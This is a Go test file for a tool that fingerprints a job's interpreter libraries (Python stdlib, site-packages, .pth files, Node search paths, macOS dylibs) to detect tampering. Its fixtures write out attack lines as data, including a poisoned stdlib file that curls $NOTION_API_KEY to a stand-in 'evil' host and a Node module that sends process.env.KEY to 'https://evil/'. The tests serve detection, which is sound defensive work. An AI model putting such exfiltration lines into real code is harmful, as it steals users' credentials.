// Copyright 2026 Meni Tasa
// SPDX-License-Identifier: LicenseRef-PolyForm-Perimeter-1.0.0

package job

import (
	"bytes"
	"encoding/binary"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// The interpreter's libraries (libs.go, interp.go). Every fixture here is a
// fake layout in temp folders: nothing runs, and no test depends on a real
// Python. TestRealInterpreters, gated, checks the reading against real ones.

// pyFixture is a fake Python installation and a job folder that uses it
// through a venv, shaped like uv's: the venv's bin/python links to the
// installation's interpreter through a minor-version symlink, and
// pyvenv.cfg's home names that symlink.
type pyFixture struct {
	dir  string // the job folder, resolved
	base string // the installation prefix, resolved
	link string // the minor-version symlink to base
	prog Program
}

func resolved(t *testing.T, p string) string {
	t.Helper()
	r, err := filepath.EvalSymlinks(p)
	if err != nil {
		t.Fatal(err)
	}
	return r
}

func installPython(t *testing.T, base string) {
	t.Helper()
	write(t, filepath.Join(base, "bin/python3.14"), "interpreter v1")
	if err := os.Chmod(filepath.Join(base, "bin/python3.14"), 0o700); err != nil {
		t.Fatal(err)
	}
	write(t, filepath.Join(base, "lib/python3.14/os.py"), "# the landmark\n")
	write(t, filepath.Join(base, "lib/python3.14/encodings/__init__.py"), "# decodes before any script runs\n")
	write(t, filepath.Join(base, "lib/python3.14/json/__init__.py"), "# json\n")
	write(t, filepath.Join(base, "lib/python3.14/json/__pycache__/__init__.cpython-314.pyc"), "bytecode")
	write(t, filepath.Join(base, "lib/python3.14/lib-dynload/_json.cpython-314-darwin.so"), "native")
	write(t, filepath.Join(base, "lib/python3.14/site-packages/README.txt"), "base site-packages\n")
}

func pythonFixture(t *testing.T) pyFixture {
	t.Helper()
	uv := resolved(t, t.TempDir())
	base := filepath.Join(uv, "cpython-3.14.7")
	installPython(t, base)
	link := filepath.Join(uv, "cpython-3.14")
	if err := os.Symlink(base, link); err != nil {
		t.Fatal(err)
	}
	dir := resolved(t, t.TempDir())
	write(t, filepath.Join(dir, "export.py"), "import json\n")
	write(t, filepath.Join(dir, ".venv/pyvenv.cfg"), "home = "+filepath.Join(link, "bin")+"\ninclude-system-site-packages = false\n")
	write(t, filepath.Join(dir, ".venv/lib/python3.14/site-packages/requests/__init__.py"), "# requests\n")
	if err := os.MkdirAll(filepath.Join(dir, ".venv/bin"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(link, "bin/python3.14"), filepath.Join(dir, ".venv/bin/python")); err != nil {
		t.Fatal(err)
	}
	return pyFixture{
		dir: dir, base: base, link: link,
		prog: Program{Exe: filepath.Join(dir, ".venv/bin/python"), Argv: []string{".venv/bin/python", "export.py"}, PathEnv: "/usr/bin:/bin", Home: t.TempDir()},
	}
}

func mustCompute(t *testing.T, dir string, p Program) Fingerprint {
	t.Helper()
	fp, err := Compute(dir, p, nil, nil)
	if err != nil {
		t.Fatalf("Compute: %v", err)
	}
	return fp
}

// hasChange reports whether changes name path with kind.
func hasChange(changes []Change, path string, kind ChangeKind) bool {
	for _, c := range changes {
		if c.Path == path && c.Kind == kind {
			return true
		}
	}
	return false
}

func TestLibsCoverTheInterpretersInstallation(t *testing.T) {
	f := pythonFixture(t)
	if gap := Unfingerprinted(f.dir, f.prog); gap != "" {
		t.Fatalf("a venv's python has a gap: %s", gap)
	}
	a := mustCompute(t, f.dir, f.prog)
	for _, want := range []string{
		"lib/python3.14/os.py", "lib/python3.14/encodings/__init__.py",
		"lib/python3.14/json/__pycache__/__init__.cpython-314.pyc",
		"lib/python3.14/lib-dynload/_json.cpython-314-darwin.so", "bin/python3.14",
	} {
		if v := a.Libs[filepath.Join(f.base, want)]; !strings.HasPrefix(v, "sha256:") {
			t.Errorf("Libs[%s] = %q, want a hash", want, v)
		}
	}
	// The venv is inside the folder: the folder walk has it, not Libs.
	for k := range a.Libs {
		if inside(k, f.dir) {
			t.Errorf("Libs holds %s, which the folder walk already covers", k)
		}
	}
	// pyvenv.cfg's home is recorded with where it resolves.
	if v := a.Libs[filepath.Join(f.link, "bin")]; v != "dir @ "+filepath.Join(f.base, "bin") {
		t.Errorf("home entry = %q", v)
	}
	b := mustCompute(t, f.dir, f.prog)
	if d := Diff(a, b); len(d) != 0 || a.Root != b.Root {
		t.Fatalf("an unchanged installation differs: %v", d)
	}
}

func TestEditingTheStdlibStopsTheJob(t *testing.T) {
	f := pythonFixture(t)
	a := mustCompute(t, f.dir, f.prog)
	enc := filepath.Join(f.base, "lib/python3.14/encodings/__init__.py")
	write(t, enc, "import os; os.system('curl -d @- evil <<< $NOTION_API_KEY')\n")
	d := Diff(a, mustCompute(t, f.dir, f.prog))
	if !hasChange(d, enc, Changed) {
		t.Fatalf("an edited stdlib file went unseen: %v", d)
	}
	if s := d[0].Sentence(); !strings.Contains(s, enc) {
		t.Fatalf("the stop does not name the file: %q", s)
	}
}

func TestSitePackagesChangesStopTheJob(t *testing.T) {
	f := pythonFixture(t)
	site := filepath.Join(f.base, "lib/python3.14/site-packages")

	t.Run("a .pth dropped into the base site-packages", func(t *testing.T) {
		a := mustCompute(t, f.dir, f.prog)
		pth := filepath.Join(site, "zzz.pth")
		write(t, pth, "import os; os.system('evil')\n")
		defer os.Remove(pth)
		if d := Diff(a, mustCompute(t, f.dir, f.prog)); !hasChange(d, pth, Added) {
			t.Fatalf("a planted .pth went unseen: %v", d)
		}
	})

	t.Run("a venv outside the folder", func(t *testing.T) {
		venv := resolved(t, t.TempDir())
		write(t, filepath.Join(venv, "pyvenv.cfg"), "home = "+filepath.Join(f.base, "bin")+"\n")
		mod := filepath.Join(venv, "lib/python3.14/site-packages/requests/__init__.py")
		write(t, mod, "# requests\n")
		if err := os.MkdirAll(filepath.Join(venv, "bin"), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink(filepath.Join(f.base, "bin/python3.14"), filepath.Join(venv, "bin/python")); err != nil {
			t.Fatal(err)
		}
		p := Program{Exe: filepath.Join(venv, "bin/python"), Argv: []string{filepath.Join(venv, "bin/python"), "export.py"}}
		a := mustCompute(t, f.dir, p)
		write(t, mod, "# requests, patched to send the key\n")
		pth := filepath.Join(venv, "lib/python3.14/site-packages/hook.pth")
		write(t, pth, "import hook\n")
		d := Diff(a, mustCompute(t, f.dir, p))
		if !hasChange(d, mod, Changed) || !hasChange(d, pth, Added) {
			t.Fatalf("changes in an outside venv went unseen: %v", d)
		}
	})

	t.Run("a folder a .pth path line adds", func(t *testing.T) {
		src := resolved(t, t.TempDir())
		mod := filepath.Join(src, "mypkg/__init__.py")
		write(t, mod, "# an editable install\n")
		pth := filepath.Join(f.dir, ".venv/lib/python3.14/site-packages/_mypkg.pth")
		write(t, pth, src+"\n")
		defer os.Remove(pth)
		a := mustCompute(t, f.dir, f.prog)
		if !strings.HasPrefix(a.Libs[mod], "sha256:") {
			t.Fatalf("the .pth folder is not fingerprinted: Libs[%s] = %q", mod, a.Libs[mod])
		}
		write(t, mod, "# edited\n")
		if d := Diff(a, mustCompute(t, f.dir, f.prog)); !hasChange(d, mod, Changed) {
			t.Fatalf("an edit in a .pth folder went unseen: %v", d)
		}
	})
}

// The files CPython looks for at start that change what it loads: each must
// stop the job when it appears.
func TestPlantedStartupFilesStopTheJob(t *testing.T) {
	f := pythonFixture(t)
	// The installation's interpreter started through a symlink outside it,
	// as /opt/homebrew/bin/python3 is: CPython looks for pyvenv.cfg beside
	// that path and one folder up, and for a ._pth file beside it.
	brew := resolved(t, t.TempDir())
	if err := os.MkdirAll(filepath.Join(brew, "bin"), 0o700); err != nil {
		t.Fatal(err)
	}
	py := filepath.Join(brew, "bin/python3")
	if err := os.Symlink(filepath.Join(f.base, "bin/python3.14"), py); err != nil {
		t.Fatal(err)
	}
	direct := Program{Exe: py, Argv: []string{"python3", "export.py"}}
	for _, c := range []struct {
		name string
		prog Program
		path string
	}{
		{"a stdlib zip, first on sys.path", f.prog, filepath.Join(f.base, "lib/python314.zip")},
		{"a ._pth beside the real interpreter", f.prog, filepath.Join(f.base, "bin/python3.14._pth")},
		{"a landmark lower than the real one", f.prog, filepath.Join(f.base, "bin/lib/python3.14/os.py")},
		{"bytecode new in the library", f.prog, filepath.Join(f.base, "lib/python3.14/__pycache__/os.cpython-314.pyc")},
		{"a pyvenv.cfg beside a linked interpreter", direct, filepath.Join(brew, "bin/pyvenv.cfg")},
		{"a pyvenv.cfg above a linked interpreter", direct, filepath.Join(brew, "pyvenv.cfg")},
		{"a ._pth beside a linked interpreter", direct, py + "._pth"},
	} {
		t.Run(c.name, func(t *testing.T) {
			a := mustCompute(t, f.dir, c.prog)
			write(t, c.path, "home = /tmp/evil\n")
			defer os.Remove(c.path)
			if d := Diff(a, mustCompute(t, f.dir, c.prog)); !hasChange(d, c.path, Added) {
				t.Fatalf("%s went unseen: %v", c.path, d)
			}
		})
	}
}

// Re-pointing a symlink on the way to the installation (uv's minor-version
// link) at a copy with the same interpreter and a poisoned stdlib: every
// file the fingerprint knew is now elsewhere.
func TestRepointedInstallationStopsTheJob(t *testing.T) {
	f := pythonFixture(t)
	a := mustCompute(t, f.dir, f.prog)
	evil := filepath.Join(filepath.Dir(f.base), "cpython-3.14.8")
	installPython(t, evil)
	write(t, filepath.Join(evil, "lib/python3.14/encodings/__init__.py"), "# poisoned\n")
	if err := os.Remove(f.link); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(evil, f.link); err != nil {
		t.Fatal(err)
	}
	d := Diff(a, mustCompute(t, f.dir, f.prog))
	if !hasChange(d, filepath.Join(f.base, "lib/python3.14/encodings/__init__.py"), Removed) ||
		!hasChange(d, filepath.Join(evil, "lib/python3.14/encodings/__init__.py"), Added) {
		t.Fatalf("a re-pointed installation went unseen: %v", d)
	}
}

func TestLibraryBytecodeStopExplainsItself(t *testing.T) {
	f := pythonFixture(t)
	a := mustCompute(t, f.dir, f.prog)
	write(t, filepath.Join(f.base, "lib/python3.14/__pycache__/zipfile.cpython-314.pyc"), "bytecode")
	d := Diff(a, mustCompute(t, f.dir, f.prog))
	if hint := StopHint(d); !strings.Contains(hint, "into its own library") {
		t.Fatalf("hint = %q for %v", hint, d)
	}
}

func TestLibrariesCountTowardTheLimits(t *testing.T) {
	f := pythonFixture(t)
	a := mustCompute(t, f.dir, f.prog)
	total := libFileCount(a)
	for k, v := range a.Files {
		// The folder counts its regular files; a link's target adds bytes only.
		if strings.HasPrefix(v, "sha256:") && !strings.HasSuffix(k, LinkTargetSuffix) {
			total++
		}
	}
	defer func(n int) { limitFiles = n }(limitFiles)
	limitFiles = total
	if _, err := Compute(f.dir, f.prog, nil, nil); err != nil {
		t.Fatalf("at the limit exactly: %v", err)
	}
	limitFiles = total - 1
	if _, err := Compute(f.dir, f.prog, nil, nil); !errors.Is(err, ErrTooLarge) {
		t.Fatalf("one file past the limit: err = %v, want ErrTooLarge", err)
	}
	limitFiles = MaxFiles
	defer func(n int64) { limitBytes = n }(limitBytes)
	limitBytes = 16
	if _, err := Compute(f.dir, f.prog, nil, nil); !errors.Is(err, ErrTooLarge) {
		t.Fatalf("past the byte limit: err = %v, want ErrTooLarge", err)
	}
}

func libFileCount(fp Fingerprint) int {
	n := 0
	for _, v := range fp.Libs {
		if strings.HasPrefix(v, "sha256:") {
			n++
		}
	}
	return n
}

// The cache must never answer for a file that was written since: a
// same-size rewrite with its modification time put back still moves the
// change-time, which only the kernel sets.
func TestLibCacheSeesASameSizeRewrite(t *testing.T) {
	defer func(w time.Duration) { racyWindow = w }(racyWindow)
	racyWindow = -time.Hour // cache everything, however recent
	f := pythonFixture(t)
	enc := filepath.Join(f.base, "lib/python3.14/encodings/__init__.py")
	a := mustCompute(t, f.dir, f.prog)
	libCacheMu.Lock()
	_, cached := libCache[enc]
	libCacheMu.Unlock()
	if !cached {
		t.Fatal("the file was not cached; the test would prove nothing")
	}
	info, err := os.Stat(enc)
	if err != nil {
		t.Fatal(err)
	}
	time.Sleep(10 * time.Millisecond)
	old, _ := os.ReadFile(enc)
	write(t, enc, strings.Repeat("x", len(old)))
	if err := os.Chtimes(enc, info.ModTime(), info.ModTime()); err != nil {
		t.Fatal(err)
	}
	if d := Diff(a, mustCompute(t, f.dir, f.prog)); !hasChange(d, enc, Changed) {
		t.Fatalf("a same-size rewrite with its time put back went unseen: %v", d)
	}
}

func TestOldApprovalStopsOnlyWhenTheProgramLoadsLibraries(t *testing.T) {
	f := pythonFixture(t)
	now := mustCompute(t, f.dir, f.prog)
	old := now
	old.Libs, old.LibsV = nil, 0
	if d := Diff(old, now); !hasChange(d, LibsPath, Unchecked) {
		t.Fatalf("a pre-libraries approval of a Python job: %v", d)
	}
	if s := (Change{Path: LibsPath, Kind: Unchecked}).Sentence(); !strings.Contains(s, "approve it again") {
		t.Fatalf("sentence = %q", s)
	}
	sh := Program{Exe: "/bin/sh", Argv: []string{"/bin/sh", "export.py"}}
	shNow := mustCompute(t, f.dir, sh)
	shOld := shNow
	shOld.Libs, shOld.LibsV = nil, 0
	if d := Diff(shOld, shNow); len(d) != 0 {
		t.Fatalf("a /bin/sh job loads nothing jit did not see, yet: %v", d)
	}
}

func TestUnfingerprintedNamesWhatJitCannotCover(t *testing.T) {
	f := pythonFixture(t)
	bin := resolved(t, t.TempDir())
	exe := func(name, body string) string {
		p := filepath.Join(bin, name)
		write(t, p, body)
		if err := os.Chmod(p, 0o700); err != nil {
			t.Fatal(err)
		}
		return p
	}
	uv := exe("uv", "a launcher")
	ruby := exe("ruby", "an interpreter")
	shim := exe("python3", "#!/usr/bin/env bash\nexec pyenv exec python3 \"$@\"\n")
	lonely := exe("python3.13", "no installation around it")
	node := exe("node", "node")
	tool := exe("gh", "a plain program")
	outside := filepath.Join(resolved(t, t.TempDir()), "tool.py")
	write(t, outside, "print(1)\n")
	envScript := filepath.Join(f.dir, "run.py")
	write(t, envScript, "#!/usr/bin/env python3.14\nprint(1)\n")
	if err := os.Symlink(filepath.Join(f.base, "bin/python3.14"), filepath.Join(bin, "python3.14")); err != nil {
		t.Fatal(err)
	}

	for _, c := range []struct {
		name string
		p    Program
		gap  string // a word the gap must hold; "" for none
	}{
		{"a venv's python", f.prog, ""},
		{"uv run", Program{Exe: uv, Argv: []string{"uv", "run", "export.py"}}, "uv picks the Python"},
		{"ruby", Program{Exe: ruby, Argv: []string{"ruby", "x.rb"}}, "ruby loads libraries"},
		{"a version manager's shim", Program{Exe: shim, Argv: []string{"python3", "export.py"}}, "picks the interpreter when it runs"},
		{"a python with no installation", Program{Exe: lonely, Argv: []string{"python3.13", "export.py"}}, "can't find the Python installation"},
		{"a script outside the folder", Program{Exe: f.prog.Exe, Argv: []string{".venv/bin/python", outside}}, "loads modules from the script's own folder"},
		{"a #! script run through env", Program{Exe: envScript, Argv: []string{"./run.py"}, PathEnv: bin}, ""},
		{"node", Program{Exe: node, Argv: []string{"node", "index.js"}}, ""},
		{"a shell", Program{Exe: "/bin/sh", Argv: []string{"/bin/sh", "x.sh"}}, ""},
		{"a plain program", Program{Exe: tool, Argv: []string{"gh", "api"}}, ""},
	} {
		t.Run(c.name, func(t *testing.T) {
			gap := Unfingerprinted(f.dir, c.p)
			if c.gap == "" && gap != "" || c.gap != "" && !strings.Contains(gap, c.gap) {
				t.Fatalf("gap = %q, want %q", gap, c.gap)
			}
		})
	}

	// The #! script's interpreter is found on the job's PATH, and its
	// installation is fingerprinted as if it were named on the command line.
	p := Program{Exe: envScript, Argv: []string{"./run.py"}, PathEnv: bin}
	a := mustCompute(t, f.dir, p)
	enc := filepath.Join(f.base, "lib/python3.14/encodings/__init__.py")
	if !strings.HasPrefix(a.Libs[enc], "sha256:") {
		t.Fatalf("a #! python's stdlib is not fingerprinted: %q", a.Libs[enc])
	}
	// A python3.14 put earlier on that PATH is a different interpreter.
	early := resolved(t, t.TempDir())
	installPython(t, early)
	p2 := p
	p2.PathEnv = filepath.Join(early, "bin") + ":" + bin
	if d := Diff(a, mustCompute(t, f.dir, p2)); len(d) == 0 {
		t.Fatal("an interpreter planted earlier on PATH went unseen")
	}
}

// Node looks for a package in every folder above the job's, and in its
// global folders: one appearing there is code the job would load.
func TestNodeSearchPathsAreFingerprinted(t *testing.T) {
	parent := resolved(t, t.TempDir())
	dir := filepath.Join(parent, "job")
	write(t, filepath.Join(dir, "index.js"), "require('left-pad')\n")
	bin := resolved(t, t.TempDir())
	node := filepath.Join(bin, "bin/node")
	write(t, node, "node")
	home := resolved(t, t.TempDir())
	p := Program{Exe: node, Argv: []string{"node", "index.js"}, Home: home}
	for _, planted := range []string{
		filepath.Join(parent, "node_modules/left-pad/index.js"),
		filepath.Join(home, ".node_modules/left-pad/index.js"),
		filepath.Join(bin, "lib/node/left-pad/index.js"),
		filepath.Join(parent, "package.json"),
	} {
		a := mustCompute(t, dir, p)
		write(t, planted, "module.exports = () => fetch('https://evil/' + process.env.KEY)\n")
		d := Diff(a, mustCompute(t, dir, p))
		if len(d) == 0 {
			t.Fatalf("%s went unseen", planted)
		}
		if err := os.RemoveAll(planted); err != nil {
			t.Fatal(err)
		}
	}
}

// machO builds a minimal 64-bit Mach-O: a header and the load commands the
// closure reads (LC_LOAD_DYLIB, LC_LOAD_WEAK_DYLIB, LC_RPATH). dyld would
// never load it; debug/macho reads it like a real one.
func machO(deps, weak, rpaths []string) []byte {
	var cmds bytes.Buffer
	le := binary.LittleEndian
	n := 0
	pad := func(s string, hdr int) []byte {
		b := append([]byte(s), 0)
		for (hdr+len(b))%8 != 0 {
			b = append(b, 0)
		}
		return b
	}
	dylib := func(cmd uint32, name string) {
		s := pad(name, 24)
		for _, v := range []uint32{cmd, uint32(24 + len(s)), 24, 0, 0, 0} {
			_ = binary.Write(&cmds, le, v)
		}
		cmds.Write(s)
		n++
	}
	for _, d := range deps {
		dylib(lcLoadDylib, d)
	}
	for _, d := range weak {
		dylib(lcLoadWeakDylib, d)
	}
	for _, r := range rpaths {
		s := pad(r, 12)
		for _, v := range []uint32{lcRpath, uint32(12 + len(s)), 12} {
			_ = binary.Write(&cmds, le, v)
		}
		cmds.Write(s)
		n++
	}
	var out bytes.Buffer
	for _, v := range []uint32{0xfeedfacf, 0x0100000c, 0, 6, uint32(n), uint32(cmds.Len()), 0, 0} {
		_ = binary.Write(&out, le, v)
	}
	out.Write(cmds.Bytes())
	return out.Bytes()
}

func writeBytes(t *testing.T, path string, b []byte) {
	t.Helper()
	write(t, path, string(b))
}

// Homebrew's Python and Node link dozens of dylibs from /opt/homebrew, which
// the user can write: every Mach-O fingerprinted has its libraries
// fingerprinted, at every place dyld would look, recursively.
func TestNativeLibrariesAreFingerprinted(t *testing.T) {
	dir := resolved(t, t.TempDir())
	write(t, filepath.Join(dir, "run.sh"), "echo hi\n")
	brew := resolved(t, t.TempDir())
	libfoo := filepath.Join(brew, "opt/foo/lib/libfoo.dylib")
	libbaz := filepath.Join(brew, "opt/foo/lib/libbaz.dylib")
	early := filepath.Join(brew, "early")
	late := filepath.Join(brew, "late")
	libbar := filepath.Join(late, "libbar.dylib")
	writeBytes(t, libfoo, machO([]string{"@loader_path/libbaz.dylib", "/usr/lib/libSystem.B.dylib"}, nil, nil))
	writeBytes(t, libbaz, machO(nil, nil, nil))
	writeBytes(t, libbar, machO(nil, nil, nil))
	if err := os.MkdirAll(early, 0o700); err != nil {
		t.Fatal(err)
	}
	tool := filepath.Join(brew, "bin/tool")
	writeBytes(t, tool, machO([]string{libfoo, "@rpath/libbar.dylib"}, []string{filepath.Join(brew, "opt/gone/libgone.dylib")}, []string{early, late}))
	// And a compiled module in the folder's venv that links one more.
	libpq := filepath.Join(brew, "opt/libpq/lib/libpq.dylib")
	writeBytes(t, libpq, machO(nil, nil, nil))
	writeBytes(t, filepath.Join(dir, ".venv/lib/python3.14/site-packages/_psycopg.so"), machO([]string{libpq}, nil, nil))

	p := Program{Exe: tool, Argv: []string{"tool", "run.sh"}}
	a := mustCompute(t, dir, p)
	for _, f := range []string{libfoo, libbaz, libbar, libpq} {
		if !strings.HasPrefix(a.Libs[f], "sha256:") {
			t.Errorf("Libs[%s] = %q, want a hash", f, a.Libs[f])
		}
	}
	for _, f := range []string{filepath.Join(early, "libbar.dylib"), filepath.Join(brew, "opt/gone/libgone.dylib")} {
		if a.Libs[f] != AbsentEntry {
			t.Errorf("Libs[%s] = %q, want %s", f, a.Libs[f], AbsentEntry)
		}
	}
	for k := range a.Libs {
		if strings.HasPrefix(k, "/usr/lib/") {
			t.Errorf("a system library is in Libs: %s", k)
		}
	}

	for _, c := range []struct {
		name string
		path string
		kind ChangeKind
	}{
		{"a linked dylib rewritten", libfoo, Changed},
		{"a dylib it links in turn rewritten", libbaz, Changed},
		{"a compiled module's dylib rewritten", libpq, Changed},
		{"a dylib planted at an earlier rpath", filepath.Join(early, "libbar.dylib"), Added},
		{"a missing weak dylib appearing", filepath.Join(brew, "opt/gone/libgone.dylib"), Added},
	} {
		t.Run(c.name, func(t *testing.T) {
			before := mustCompute(t, dir, p)
			old, _ := os.ReadFile(c.path)
			writeBytes(t, c.path, append(machO(nil, nil, nil), "evil"...))
			defer func() {
				if old == nil {
					_ = os.Remove(c.path)
				} else {
					writeBytes(t, c.path, old)
				}
			}()
			if d := Diff(before, mustCompute(t, dir, p)); !hasChange(d, c.path, c.kind) {
				t.Fatalf("%s went unseen: %v", c.path, d)
			}
		})
	}
}

func TestSIPProtectedPaths(t *testing.T) {
	for p, want := range map[string]bool{
		"/usr/lib/libSystem.B.dylib":                 true,
		"/System/Library/Frameworks/CF.framework/CF": true,
		"/bin/sh":                                     true,
		"/usr/local/lib/libfoo.dylib":                 false,
		"/USR/LOCAL/lib/libfoo.dylib":                 false,
		"/System/Volumes/Data/Users/x/lib.dylib":      false,
		"/System/volumes/Data/Users/x/lib.dylib":      false,
		"/usr/lib/../../Users/x/libevil.dylib":        false,
		"/opt/homebrew/lib/libssl.3.dylib":            false,
		"/Users/x/.local/share/uv/python/bin/python3": false,
	} {
		if got := sipProtected(p); got != want {
			t.Errorf("sipProtected(%s) = %v, want %v", p, got, want)
		}
	}
}

// Apple's own Python builds (Xcode's, the Command Line Tools') add
// site-packages folders outside the prefix from their patched site.py. Found
// by the real-interpreter cross-check; here on a fake Xcode layout.
func TestAppleSitePackagesAreRecorded(t *testing.T) {
	xcode := resolved(t, t.TempDir())
	base := filepath.Join(xcode, "Xcode.app/Contents/Developer/Library/Frameworks/Python3.framework/Versions/3.9")
	write(t, filepath.Join(base, "bin/python3"), "interpreter")
	write(t, filepath.Join(base, "lib/python3.9/os.py"), "# landmark\n")
	dir := resolved(t, t.TempDir())
	write(t, filepath.Join(dir, "x.py"), "print(1)\n")
	p := Program{Exe: filepath.Join(base, "bin/python3"), Argv: []string{"python3", "x.py"}}
	a := mustCompute(t, dir, p)
	internal := filepath.Join(xcode, "Xcode.app/Contents/Developer/AppleInternal/Library/Python/3.9/site-packages")
	for _, site := range []string{"/Library/Python/3.9/site-packages", "/AppleInternal/Library/Python/3.9/site-packages", internal} {
		if _, ok := a.Libs[site]; !ok {
			t.Errorf("%s is not recorded", site)
		}
	}
	mod := filepath.Join(internal, "evil.py")
	write(t, mod, "import os\n")
	// The folder appearing is walked; the code in it is what stops the job.
	if d := Diff(a, mustCompute(t, dir, p)); !hasChange(d, mod, Added) {
		t.Fatalf("a site folder appearing went unseen: %v", d)
	}
}
